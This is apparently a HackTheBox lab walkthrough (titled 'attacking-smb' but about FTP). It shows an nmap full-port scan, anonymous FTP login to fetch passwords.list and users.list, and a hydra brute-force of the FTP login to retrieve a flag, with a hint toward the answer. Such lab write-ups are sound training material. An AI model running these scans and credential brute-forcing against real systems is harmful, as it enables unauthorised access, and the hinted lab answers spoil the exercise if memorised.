---
tags:
  - htb
  - linux
  - "#ftp"
  - "#hydra"
draft: false
date: 2026-05-29
title: attacking-smb
---
### Q1: What port is the FTP service running on?
let's run the `nmap` scan:

```
sudo nmap -sC -sV -A -T4 -p- $ipAddress$
```

### Q2: What username is available for the FTP server?

let's check if we can connect anonymously:
```
ftp $ipAddress$ $port$
```

it worked:
```
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61674|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
226 Transfer complete
```

now we can get the files:
```
get passwords.list
get users.list
```

from `users.list` we can find the answer for the question. 
**HINT**:second position in found file:)

### Q3: Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.

let's try brute-force attack:

```
hydra -l $foundUsername$ -P passwords.list ftp://$ipAddress$:$port$
```

it worked, now we can connect with FTP server and get the flag.

